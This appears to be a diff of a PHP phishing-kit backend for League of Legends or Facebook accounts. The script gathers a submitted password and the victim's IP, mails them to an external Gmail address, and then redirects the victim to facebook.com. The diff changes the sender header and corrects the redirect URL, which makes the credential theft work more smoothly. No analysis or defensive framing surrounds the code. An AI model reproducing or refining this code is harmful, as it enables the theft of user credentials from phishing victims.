@@ -7,7 +7,7 @@ $message .= "Pass                    : ".$_POST['password']."\n";
 $message .= "-----------------|Account Origin|-------------------\n";
 $send="lolprodajaacc@gmail.com";
 $subject = "LOL INFO | $ip";
-$headers = "From: LOL <origin@fucked.com>";
+$headers = "From: LOL <lolprodajaacc@gmail.com>";
 mail($send,$subject,$message,$headers);
-header("Location: www.facebook.com");
+header("Location: https://www.facebook.com/");
 ?>
